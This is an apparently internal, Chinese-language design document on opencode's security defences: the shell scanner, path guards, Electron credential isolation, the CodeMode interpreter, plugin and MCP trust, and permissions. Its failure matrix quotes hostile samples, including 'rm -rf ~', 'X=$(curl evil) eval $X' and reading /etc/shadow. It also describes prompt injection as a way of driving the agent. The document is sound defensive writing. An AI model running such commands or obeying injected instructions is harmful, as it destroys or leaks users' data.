# 安全防御（Security）

> 一句话：**opencode 的安全模型是"边界收口 + fail-closed 默认"——shell 扫描器把不可分析的命令如实上报 opaque、路径三重闸门挡逃逸、渲染进程凭据止步主进程、CodeMode 自建解释器只暴露白名单 API、权限系统无规则即 deny——但官方 SECURITY.md 明言：权限系统是 UX 不是沙箱，真隔离请用 Docker/VM。**
> 代码基线：v2.0.30，dev 分支（commit `e25b7abf89`）；行号实测（2026-10-22，sed 抽查 ≥15 处）。
> 权威出处：`SECURITY.md`（威胁模型官方声明）+ `packages/codemode/README.md`（CodeMode 沙箱哲学）。
> [返回 README](README.md) | 关联 [../6_modules/17_job.md](../6_modules/17_job.md) §扫描器 / [../6_modules/11_permission.md](../6_modules/11_permission.md) / [../6_modules/13_plugin.md](../6_modules/13_plugin.md) / [../6_modules/14_mcp.md](../6_modules/14_mcp.md) / [../6_modules/10_skill.md](../6_modules/10_skill.md) / [../5_timeline/1_desktop-boot.md](../5_timeline/1_desktop-boot.md) §1.5
> 本篇是**安全视角的收口**：各篇已写的机制细节只引用不重写，这里回答"它们共同防住了什么"。

---

## 0. 恐惧清单（这个产品怕什么）

先看官方怎么想。`SECURITY.md`（仓库根）开篇威胁模型：

```
OpenCode = 本地运行的 AI 编码助手
├─ 能力面：shell 执行 + 文件读写 + 网络访问（webfetch/websearch）
├─ 恐惧 1：模型被恶意内容（网页/文件/prompt 注入）诱导执行危险命令
│    └─ 防线：shell 扫描器把命令拆成可授权的 resource 前缀（§1）+ 权限 assert（§7）
├─ 恐惧 2：AI 生成的代码直接跑 = 任意执行
│    └─ 防线：CodeMode 自建解释器，网络/文件/进程不可达（§4）
├─ 恐惧 3：文件工具写出/读入工作区之外（路径逃逸）
│    └─ 防线：FileAccess 边界 + external_directory 二次授权（§2）
├─ 恐惧 4：渲染进程被攻破（Electron 的经典恐惧：XSS → node 权限全失）
│    └─ 防线：sandbox:true + contextIsolation + preload 最小桥（§3）
├─ 恐惧 5：插件是用户装的任意第三方代码，同进程跑
│    └─ 防线：宿主模块接管 + 能力差（非通道差）信任模型（§5）
├─ 恐惧 6：MCP server 是外部不可信方，其 schema/响应直进 LLM 上下文
│    └─ 防线：权限 assert + schema 零转换的取舍 + elicitation Location 域（§6）
├─ 恐惧 7：凭据泄漏（OAuth token、服务器密码被渲染进程/其他源读到）
│    └─ 防线：密码止步主进程 + Basic 头按 origin/帧注入 + DB 0600（§3）
└─ 官方边界声明（SECURITY.md "No Sandbox" 节）：
     "权限系统是 UX 功能……不是为安全隔离设计的。需要真隔离请跑在
     Docker 容器或虚拟机里。" ← 本篇所有机制都活在这个边界声明之内
```

这条边界声明是理解全篇的钥匙：opencode 的防御目标是**让不可信输入（LLM 输出、网页、第三方插件、MCP server）在"人确认"这一关之前被最大程度结构化、让确认界面显示的就是将被执行的东西**，而不是构建一个数学意义上的沙箱。以下逐层展开。

---

## 1. Shell 命令防御

### 1.1 模块地图

```
packages/core/src/shell/
├─ scan.ts ....... 2409 行 手写 Bash/Zsh/Posix + PowerShell 扫描器（纯函数，0 依赖）
├─ parse.ts ......  403 行 ShellParse.scan：legacy(wasm tree-sitter) / portable 双路由
├─ select.ts .....  227 行 ShellSelect：shell 选择 + META 黑白名单
└─ result.ts / parser-wasm.*.ts
```

### 1.2 三道资源防线（scan.ts 实测）

[17_job.md](../6_modules/17_job.md) §扫描器已讲执行管线，这里下钻安全语义。

**防线一：输入长度上限**。`scan.ts:89` `const MAX_INPUT_LENGTH = 64 * 1024`；入口 `scan()` 第一句就掐掉（`scan.ts:209`）：

```typescript
// scan.ts:208-215
export function scan(input: string, dialect: Dialect = "posix"): Result {
  if (input.length > MAX_INPUT_LENGTH) return { kind: "opaque", reason: "invalid-structure" }
  const context: BashContext = { remaining: MAX_INPUT_LENGTH * MAX_SUBSTITUTION_DEPTH, dialect }
  const result = scanBash(input, 0, 0, context)
```

**防线二：嵌套深度**。`scan.ts:90` `MAX_SUBSTITUTION_DEPTH = 32`；递归入口检查（`scan.ts:440`）：

```typescript
if (depth > MAX_SUBSTITUTION_DEPTH || context.remaining < 0) return { kind: "opaque", reason: "invalid-structure" }
```

**防线三：工作量配额**。`remaining = 64KB × 32 = 2MB` 预算（`scan.ts:210`），每次消费输入递减——这是防"指数膨胀"输入（如 `$( $( $( ... ) ) )` 嵌套展开）把扫描器自己卡死的 ReDoS 式防御。adversarial 测试明确以"scans adversarial Bash input in bounded time"为断言（`test/shell-scan/adversarial.test.ts:74`）。

### 1.3 扫什么危险模式：variableSink 三位一体

扫描器的核心安全任务：**找出"间接执行"——不出现新命令名却能执行任意代码的构造**。`scan.ts:1155-1180` 的注释原文（节选）：

> "arithmetic can run: (( )), $(( )), $[ ], subscripts, ... Values bound for later ... reach arithmetic or subscript evaluation when a variable sink appears in the command."

实现是 `BashContext` 上的三个标志（`scan.ts:134-141`）：`boundDollar`（值里有 `$`/反引号）、`boundOpen`（值里有 `(`/`{`）、`variableSink`（命令会把变量送进求值位置——`eval`、`PS4`、算术下标等）。三者齐备即 opaque（`scan.ts:213-214`）：

```typescript
if (context.boundDollar && context.boundOpen && context.variableSink)
  return { kind: "opaque", reason: "dynamic-execution" }
```

variableSink 的点火点（实测）：`PS4` 出现在任何词里（`scan.ts:251`，PS4 会在 xtrace 时被求值）、`eval` 作为 builtin（`scan.ts:371`）、zsh 的 `NULLCMD/functions` 等动态执行族（`scan.ts:253-258`）、`set -k`/同脚本 `alias=`（`scan.ts:372-374`）。

### 1.4 opaque ≠ deny：语义的诚实

`scan.ts:26` 注释原文：

> `// Opaque describes a parsing limitation, not a permission decision.`

扫描器**从不做允许/拒绝决定**。九种 opaque 原因（`scan.ts:3-13`：command-substitution / compound-command / dynamic-command-name / dynamic-execution / heredoc / invalid-redirect / invalid-structure / unterminated-escape / unterminated-quote）只表示"我看不透这条命令"。消费端在 `parse.ts:219-220` 把 opaque **转成失败**（fail-closed）：

```typescript
if (result.kind === "opaque")
  return yield* Effect.fail(new Error(`Portable shell scanner cannot analyze command: ${result.reason}`))
```

即：扫描器如实上报局限，权限层拒绝看不见的东西——而不是扫描器假装解析成功漏掉隐藏命令。

### 1.5 shell 工具的授权链（tool/plugin/shell.ts:103-152）

```
LLM 给出 command
└─ prepare（shell.ts:104）
   ├─ access.resolve({path: cwd})               :117  cwd 落到授权目录
   ├─ ShellParse.scan(command, shell, cwd)      :129  拆出 commands[] + directories[]
   ├─ directories 逐个 access.resolve           :130-135  cd 到的地方也要授权
   ├─ access.authorizeExternal([target, ...])   :136  工作区外 → external_directory 二次询问
   ├─ permission.assert({action:"shell",        :138-141
   │    resources: commands.map(c=>c.resource)})     ← 每个被扫描出的命令一个 resource
   └─ "Approval can outlive the directory, so validate immediately before spawning."
      （:142 注释原文）spawn 前重新验证 workdir 存在——防 TOCTOU：授权期间目录被删
```

### 1.6 select.ts：shell 黑白名单

`select.ts:8-19` 的 `META` 表：`fish: { deny: true }`、`nu: { deny: true }`（这两家的语法扫描器不覆盖，直接拒绝），bash/zsh/sh/ksh 等标 `login: true`（走 login shell 语义解析），powershell/pwsh 标 `ps: true`（走 `scanPowerShell`，`scan.ts:1729` 独立入口）。`compatible()`（`select.ts:80-82`）用 `deny !== true` 判断——**名单之外默认兼容**，这是可用性优先的取舍（未知 shell 走 posix 方言，posix 对 bash/zsh 保守健全，`scan.ts:204-206` 注释）。

`resolve()` 的双优先级（`select.ts:52-54`）：`priority: "config" | "compat"`——config 优先尊重用户配置（哪怕选了扫描器看不懂的 fish），compat 优先则落在 META 里非 deny 且 login 的 shell 上（工具执行时用，`shell.ts:114` 实测 `resolve({ priority: "compat" })`）。安全含义：**用户指定的 shell 永不被悄悄换掉**——换 shell 会改变命令语义进而骗过前缀授权，所以宁可让不兼容者失败也不静默替换。

### 1.7 双解析器路由：为什么留 legacy

`parse.ts:164-173`：`scan()` 按 `options.portable` 与 wasm 是否内联决定走 `scanPortable`（本篇的手写扫描器）还是 `scanLegacy`（`:175-205`，tree-sitter wasm，walk command 节点拼 resource）。开关在 `tool/plugin/shell.ts:127-129`：experimental `portable_shell_scanner` 配置，或 wasm 为空（内联失败的平台），或 local/dev 渠道默认 portable。安全上两条路径都 fail-closed：legacy 解析失败直接报错（`:184` "Failed to parse shell command"），portable 的失败是 opaque 异常（§1.4）——**没有一个分支会"解析失败但照常执行"**。

---

## 2. 路径逃逸防护

三重闸门，落在不同层：

### 2.1 闸门一：skill 发现——段级校验（skill/discovery.ts:17-25）

```typescript
function isSafeSegment(value: string) {
  return (
    value.length > 0 &&
    value !== "." && value !== ".." &&
    !value.includes("/") && !value.includes("\\") && !value.includes("\0")
  )
}
```

`isSafeRelativePath`（`:27` 起）再加 `\`、`?`、`#`、`URL.canParse` 拒绝——skill 名/路径既不能是 `..`，也不能含分隔符或被当成 URL 解析。机制细节见 [10_skill.md](../6_modules/10_skill.md)。

### 2.2 闸门二：FileAccess——工作区边界（file-access.ts:93-120）

所有文件工具（read/write/edit/glob/grep）的路径都过 `FileAccess.resolve`。内部判定（`:94-99`）：

```typescript
const internal =
  FSUtil.contains(location.directory, absolute) ||
  (worktree !== path.parse(worktree).root && FSUtil.contains(worktree, absolute))
```

- 在 Location 目录或 worktree 内 → `internal`，放行（权限规则按相对路径匹配）；
- 在外 → 不是拒绝，而是生成 `externalDirectory` 描述子（`:110-118`），由 `authorizeExternal`（`:125-142`）发起 `external_directory` 动作的**二次授权询问**——用户看到的是"AI 想碰 /etc/*"这样的绝对目录通配，而不是一条被悄悄放行的相对路径。`Project.root` 回溯到 git 根扩大 internal 范围（`:120` 的 save 规则）。

### 2.3 闸门三：desktop 自定义协议——canonical 化再比较（desktop/src/main/windows/protocol.ts:87-91）

```typescript
const file = path.resolve(rendererRoot, `.${decodeURIComponent(url.pathname)}`)
const rel = path.relative(rendererRoot, file)
if (rel.startsWith("..") || path.isAbsolute(rel)) {
  report("warning", "rejected path", { url: request.url, file })
  return new Response("Not found", { status: 404 })
}
```

这是渲染进程加载静态资产的 handler：先 `resolve` 规范化（消灭 `%2e%2e` 编码与符号拼接），再 `relative` 反算——结果以 `..` 开头或是绝对路径（Windows 跨盘符 case）即 404。注意**顺序**：不是检查输入字符串，而是检查 canonical 结果——字符串级绕过（编码、`//`、`\`）全部失效。前面还有 host 白名单（`:80-84` 非 rendererHost 一律 404）。TUI 侧同款模式见 `tui/src/editor.ts`。

---

## 3. 渲染进程沙箱与凭据边界

Electron 的经典恐惧：渲染进程一旦被 XSS 攻破，`nodeIntegration` 等于直接交出整台机器。desktop 包的三层防御（启动细节见 [5_timeline/1_desktop-boot.md](../5_timeline/1_desktop-boot.md) §1.5）：

### 3.1 窗口级：三个布尔量（实测两处一致）

```typescript
// windows/appearance.ts:43-45（early.ts:58-60 同款）
contextIsolation: true,
nodeIntegration: false,
sandbox: true,
```

`sandbox: true` 下渲染进程无 Node 运行时；`contextIsolation` 让 preload 与页面 JS 不同世界。

### 3.2 preload 桥最小化（desktop/src/preload/index.ts，全文 32 行）

`contextBridge.exposeInMainWorld("electron", {...})`（`:26-31`）只暴露 5 个成员：`windowID`、`bootstrap`、`storageSnapshot`（Promise）、`extensions`、`getPathForFile`。没有 `ipcRenderer` 直通、没有任意 invoke 通道——IPC 走 MessagePort 转交（`:10-13` postMessage），通道本身在主进程侧按 contract 收窄。**桥面 = 攻击面**，32 行就是全部桥面。

### 3.3 凭据止步主进程（sidecar-credentials.ts + security.ts）

sidecar（本地 HTTP 服务）的密码**从不进入渲染进程**：

- `ready()`（`sidecar-credentials.ts:20-22`）注释原文："**What the renderer learns about the sidecar: its origin, never its credential.**"——渲染进程只拿到 URL。
- `authorization()`（`:24-29`）只在请求 URL 的 origin 与 sidecar origin 完全一致时才拼 `Basic` 头。
- 注入点在**主进程** `webRequest.onBeforeSendHeaders`（`windows/security.ts:39-52`），注释原文（节选）：

> "Only the renderer's own top-level frame is credentialed. Other content in this session (web views, embedded pages) can reach the same loopback origin and must not inherit its access."

即：即使恶意网页嵌进会话里打到 `127.0.0.1`，它不是 renderer 顶层帧（`details.frame.parent === null && isRendererUrl(frame.url)`），拿不到 Authorization 头。这是防**CSRF/嵌页窃取 sidecar** 的帧级闸门。

配套：`setPermissionRequestHandler`（`security.ts:10-23`）白名单权限只有 `clipboard-sanitized-write`/`notifications`；`wireNavigationPolicy`（`:25-35`）拦截窗口打开与导航，非 renderer URL 一律转交系统外部打开。

### 3.4 落盘凭据：数据库 0600（database/database.ts:89-93）

```typescript
if (!existsSync(filename)) closeSync(openSync(filename, "a", 0o600))
await chmod(filename, 0o600)
```

凭证、会话、权限决策都住 SQLite（v2 起凭据从明文 `auth.json` 迁移入 DB，见 `migration/20260805200742_import_legacy_credentials.ts:39`）——文件创建即 0600，兜底再 chmod。同款纪律：persistent-pty 二进制目录 0700（`persistent-pty/binary.bun.ts:55`）。

---

## 4. CodeMode 沙箱

### 4.1 为什么自建解释器

恐惧：code mode 让模型**写代码**来编排工具调用。`eval`/`new Function`/vm 模块跑的是完整 JS——`process`、`fetch`、`require` 全部可达。`packages/codemode/README.md:7-8` 给出哲学（原文）：

> "Rather than trying to sandbox arbitrary JavaScript, CodeMode only runs the language features we implement. Programs cannot directly access the network, filesystem, processes, or application APIs."

翻译：**不是"给 JS 建沙箱"，而是"只实现能沙箱化的子集"**——白名单可达性取代黑名单封堵。Acorn 只做 parse，AST 由自研解释器（`interpreter/` 13 个文件）求值。

### 4.2 实测禁了什么

**全局表是闭集**。`interpreter/globals.ts:92-135` 的 `table` 是唯一全局来源（`:131` 注释："A table rather than a list so the names are known before any runtime exists"）。可达的只有：Object/Array/String/.../Map/Set/URL/Headers/Uint8Array/TextEncoder/crypto/structuredClone/console/JSON/Math/Promise + 错误类型 + `tools`/`search`。**不可达**：`process`、`require`、`import`、`fetch`、`setTimeout`、`globalThis`、任何 FS API（README ":16-17" 明列 "Timers, process, filesystem access, imports, and modules are unavailable"）。

**动态代码生成被焊死**。`globals.ts:29-34`：`Function` 构造器存在只为让 `fn.constructor === Function` 成立，调用即 throw（注释原文："dynamic code is unsupported"）——掐掉 `Function("return process")()` 这条经典逃逸链。

**宿主值只拷贝不共享**。`extension.ts:5-7` 注释原文："Values crossing in either direction are converted, never shared"——解释器对象与宿主对象间无引用泄漏。

**资源上限**（`interpreter/limits.ts`，注释原文开头："The timeout only fires between interpreter steps, so a single built-in must not be able to materialize an unbounded value"）：

| 上限 | 值 | 防什么 |
|---|---|---|
| `MAX_STRING_LENGTH` | 1<<24（16MiB） | 单 builtin 造超长串 |
| `MAX_ARRAY_LENGTH` | 10,000,000 | 数组炸弹 |
| `MAX_PENDING_PROMISES` | 10,000 | promise 洪水 |
| `MAX_VALUE_DEPTH` | 32 | 跨界值的深嵌套 |
| `timeoutMs`（execute.ts:56-68） | Effect 超时 | 解释器步间打断；超时时**后台未完成工作也被打断**（":73" 注释："Await all started promises"） |

注意 `execute.ts:33` 的注释（原文）："Set only after copy-out so timeouts cannot report invalid values as completed"——超时与结果拷贝的先后顺序都被显式固定，防止"超时后仍把半成品标成完成"的竞态。工具调用本身另有独立配额（README ":9-10"："limit execution time, tool calls, output size, and data"），由宿主在 `CodeMode.make` 注入。

### 4.3 与 eval/vm 路线的对比

```
eval / new Function          vm.createContext / isolate
├─ 全量 JS 语义可达          ├─ 上下文隔离但仍是 V8 全语义
├─ process/require 可达      ├─ 逃逸史悠久（Proxy 漏洞链）
└─ 无步间打断（同步死循环）   └─ 超时只能 terminate 整个 isolate
CodeMode 自建解释器
├─ 语义子集：白名单闭集（§4.2），不可达即不存在
├─ 每个 AST 节点是一次 Effect step → 步间可打断、可超时
└─ 代价：实现 13 个文件的解释器 + parity 测试追赶真机语义
```

权衡是明知的：解释器语义与真 JS 的偏差由 `codemode/test/parity.test.ts` 钉住。

---

## 5. 插件信任模型

[13_plugin.md](../6_modules/13_plugin.md) 已写宿主机制；本节只收安全面。

**前提（必须直说）**：插件与宿主**同进程**运行用户安装的任意第三方代码——这不是沙箱，等同装 npm 包的信任级别。防御因此不在"隔离"，而在两件事：

1. **运行时模块接管**（`plugin/src/runtime.ts:17-37`）：Bun 环境注册 `Bun.plugin("opencode-plugin-runtime")`，插件自带 node_modules 里的 `effect`/`@opencode/plugin` 被 `onLoad` **直接抛错**（`:31-34` 原文："plugins must use the host's effect and @opencode/plugin modules"）。这是防"两份 effect 实例"导致的类型混淆与 fiber 体系割裂——不是防恶意，是防**事故**，但客观上消灭了一条"用旧版/魔改 effect 触碰宿主内部不变量"的路径。`createForeignPackageFilter`（`:40-52`）用宿主根路径正则区分敌我。

2. **能力差而非通道差**（13_plugin.md §4 详述）：外部插件的 ctx 拿不到 `Config.Service`、`FileAccess.Service` 等内部服务——靠 Context.pick 的捕获范围，而非运行时检查。

插件**能做的坏事**（无防御，信任模型承认）：读进程内存里的凭据、发网络请求、写任意文件、hook 里篡改 event。缓解仅有一层：FileAccess/Permission 在 hook **之后**的执行点仍然生效（工具执行单口在 `Snapshot.execute`，见 [9_tool.md](../6_modules/9_tool.md)）——插件能改请求，改完后仍要过权限关。止步于此。

---

## 6. MCP 不可信边界

[14_mcp.md](../6_modules/14_mcp.md) 写连接与生命周期；安全面三处：

1. **schema 零转换直传的取舍**。`tool/mcp.ts:47`：`input: (tool.inputSchema ?? { type: "object", properties: {} }) as JsonSchema.JsonSchema`——外部 server 的 JSON Schema **不校验、直接 as** 进工具注册表。风险面：恶意 schema（超长 description、误导性字段名）直进 LLM 上下文，构成 prompt 注入载体；缓解是每次调用前 `permission.assert`（`mcp/index.ts:47-52` 实测，action 为 `mcp 服务器名/工具名`，metadata 携带 input），且默认无规则 → ask（§7）。
2. **elicitation 的会话域收窄**。`mcp/index.ts:91-93` 注释原文："MCP elicitations are Location-scoped, not Session-scoped: the server cannot attribute them to a persisted session row, so their forms are owned by this opaque sentinel session identifier." ——外部 server 触发的表单挂在哨兵 `GLOBAL_ELICITATION_SESSION_ID`（`"global"`）下，不给 server 任何会话身份信息。
3. **OAuth 凭据隔离**。token 的存取经 `Credential.Service`（入 0600 SQLite，§3.4）；`mcp/oauth.ts:30-35` 注释：refresh token 会轮转，并发刷新共享同一请求（KeyedMutex 按 url+client_id+refresh_token 去重），`:174` 注释强调 token 绑定 resource 而非 query（"Query is transport detail, not identity"）。另有**构建边界测试**（`test/mcp-import-boundary.test.ts:6`）："loads the MCP SDK only when connecting or authorizing"——MCP SDK 不进主 bundle，缩小常驻攻击面。

---

## 7. 权限系统作为安全层

[11_permission.md](../6_modules/11_permission.md) 已写全机制；安全视角收口三点（permission.ts 实测）：

1. **无规则 = deny-all**。`permission.ts:19`：

```typescript
const missingAgentPermissions: Permission.Ruleset = [{ action: "*", resource: "*", effect: "deny" }]
```

agent 未声明 permissions 时用它打底（`:162` 合并）——fail-closed 默认，白名单世界观：**没说允许就是问/拒**。

2. **deny 前置一票否决**。`permission.ts:165-178`：先 `denied()`（任一 resource 命中 deny 即整批拒，`:165-167`），deny 直接短路返回（`:175`），剩下的有 ask 则 ask（`:178`）。deny 永远不被后面的 allow 稀释。

3. **close 后 ask = deny**。`permission.ts:224`：会话关闭后再有权限询问，直接返回 deny——不留悬空授权窗口。

但必须重贴官方边界（SECURITY.md "No Sandbox" 节原文）："The permission system exists as a UX feature... it is **not designed to provide security isolation**." 权限系统的安全价值在于：把"模型想干什么"翻译成人可读的 resource 前缀（§1.5 的扫描器就是它的翻译官），让人肉确认有据可依。**操作者是最后一道防线，不是系统。**

---

## 8. 输入验证

**schema 解码在边界，一处校验**。Effect Schema 的 `decodeUnknown*` 集中在信任边界上（grep 实测落点）：

```
tool/runtime.ts:79    decodeInput：工具入参 decodeUnknownEffect（errors:"all"）
tool/runtime.ts:128   encodeOutput：Schema.Json 出界校验
credential.ts:70      凭据值 decodeUnknownSync（DB 行 → 强类型）
session/inbox.ts:50-54  入站消息 payload 三连 decode
config/normalize.ts:716-742  配置文件选项解码
```

工具边界的原则：**LLM 的参数是 untrusted input**——不 decode 直接用不可想象；解码失败即 Tool.Error，不进执行。

**foreign failure 强转**。`tool/runtime.ts:29-41` 注释原文（节选）：

> "Tool implementations declare Tool.Error but plugins can fail with anything at runtime. A foreign typed failure would slip past every catchTag("Tool.Error") downstream and leave its call permanently unsettled, so the declared contract is enforced here at the untrusted boundary."

插件/工具抛出任意错误 → `Effect.mapError` 在**工具边界**统一强转成 `Tool.Error`（`:38-44`）。这是防御"下游 catchTag 漏接导致 fiber 永久悬空"的契约强制——边界处把混沌错误归一，内部世界从此只需处理一种错误。

---

## 9. 失效场景矩阵

| # | 失效场景 | 撞上的防线 | 残余风险 |
|---|---|---|---|
| 1 | prompt 注入诱导 `rm -rf ~` | 扫描器拆出 `rm` resource → permission ask（§1.5） | 用户手滑点 allow——UX 层防线的天花板 |
| 2 | `X=$(curl evil) eval $X` 间接执行 | variableSink 三位一体 → opaque → parse 失败（§1.3-1.4） | opaque 命令在"总是 allow"配置下仍可执行（fail-closed 只到 ask 层） |
| 3 | 64KB+ 超长命令轰炸 | MAX_INPUT_LENGTH + 工作量配额（§1.2） | 无——扫描器有界时间 |
| 4 | read 工具读 `/etc/shadow` | FileAccess external → 二次授权（§2.2） | 用户批准即读（符合"非沙箱"定位） |
| 5 | 渲染进程 XSS 试图拿 sidecar 密码 | 密码止步主进程 + 帧级注入（§3.3） | XSS 仍可借 renderer 顶层帧发请求（Chromium 同源模型内） |
| 6 | 嵌入页对 127.0.0.1 发 CSRF | onBeforeSendHeaders 顶层帧判定（§3.3） | 无该路径 |
| 7 | CodeMode 程序想 `fetch` 外网 | 全局表白名单闭集（§4.2） | 依赖解释器实现无 bug——所以有 parity/mutation 测试（§10） |
| 8 | 恶意插件偷凭据 | **无防线**——同进程信任模型（§5） | 官方模型：装插件 = 装 npm 包，自己负责 |
| 9 | 恶意 MCP server 注入 schema | 仅 permission ask 挡执行，schema 原样进上下文（§6.1） | prompt 注入载体——已知的取舍 |
| 10 | agent 未配 permissions | missingAgentPermissions deny-all（§7.1） | 无 |
| 11 | 插件抛非 Tool.Error 异常 | 边界强转（§8） | 无——调用必结算 |
| 12 | server 模式无密码裸奔 | OPENCODE_SERVER_PASSWORD（SECURITY.md 明示） | 官方定为用户责任，out of scope |

矩阵读法：**结构化防御（1-4,7,10-11）是硬的；社会性防御（5,8,9,12）停在信任模型这一层**——与 SECURITY.md 的自我声明完全一致。

---

## 10. 测试覆盖

```
防线                      测试文件（实测存在）
─────────────────────────────────────────────────────────────
shell 扫描器              packages/core/test/shell-scan/（15 个文件）
  ├─ adversarial.test.ts    恶意语料有界时间（"$(", heredoc 注入, sudo sh -c…）
  ├─ bash-safety.test.ts    双 shell 真机执行 vs 扫描结果一致性
  │                         （定义："scanner 必须看见 shell 真会执行的命令"）
  ├─ powershell-safety / powershell-syntax / powershell-runtime
  ├─ oracle / generated / mutation / parity-regressions   回归与模糊
  └─ redirect / arithmetic / compound-parity / bash-syntax / scan / closure
路径闸门                  core/test/file-access-path.test.ts（resolve 语义）
                          core/test/file-access.test.ts（授权流）
                          core/test/skill-discovery.test.ts + skill/（段校验）
权限                      core/test/permission.test.ts（deny 短路 :107-128 等）
CodeMode                  packages/codemode/test/codemode.test.ts + parity.test.ts
插件运行时                packages/plugin/test/host.test.ts
MCP                       core/test/mcp.test.ts / mcp-oauth.test.ts /
                          mcp-import-boundary.test.ts（SDK 不进主 bundle）
desktop 凭据              desktop/src/main/service/sidecar-credentials.test.ts
                          desktop/src/main/windows/headers.test.ts
DB 0600                   desktop/src/main/storage/database.test.ts
```

值得单记的设计：`bash-safety.test.ts` 的断言方式是**真机执行对照**——先 `Bun.spawnSync` 跑 bash/zsh 确认 `scan_probe` 函数真的被执行，再断言扫描器的 commands 里含有它。防的不是"扫描器崩了"，而是"扫描器**漏看**了一个会被执行的命令"——这正是 §1 全部机制的存在理由。

---

## 演进注记

对照旧卷：16_pty-job（扫描器执行面）、11_permission（规则四面体）、13_plugin（宿主机制）、10_skill（发现管线）、14_mcp（连接生命周期）、18_credentials（认证流）各有其篇；本篇为**新增域**——首次把散在各篇的防御机制按"恐惧 → 防线 → 失效"收口成安全视角总图，并引入此前未覆盖的实码：variableSink 三位一体（scan.ts:1155-1180）、desktop 帧级凭据注入（security.ts:39-52）、CodeMode 全局闭集与上限（globals.ts:92-135 / limits.ts）、SECURITY.md 威胁模型边界声明。v1 时代无 scan.ts（tree-sitter legacy 路径为 parse.ts:175 起，wasm 缺失时回退 portable，`tool/plugin/shell.ts:127-129` 的 `portable` 开关即两条路径的切换点）。

## 相关篇

- [17_job.md](../6_modules/17_job.md) — shell 扫描器执行面、opaque 语义（本篇 §1 下钻其安全视角）
- [11_permission.md](../6_modules/11_permission.md) — 权限规则四面体（本篇 §7 只收安全口）
- [13_plugin.md](../6_modules/13_plugin.md) — 插件宿主机制（本篇 §5 只写信任模型）
- [10_skill.md](../6_modules/10_skill.md) — skill 发现管线（§2.1 闸门的上下文）
- [14_mcp.md](../6_modules/14_mcp.md) — MCP 连接与生命周期（§6 的功能面）
- [18_credentials.md](../6_modules/18_credentials.md) — 认证流（§3.4 凭据落盘的功能面）
- [../5_timeline/1_desktop-boot.md](../5_timeline/1_desktop-boot.md) §1.5 — 渲染进程启动时序（§3 的机制在哪个阶段就位）
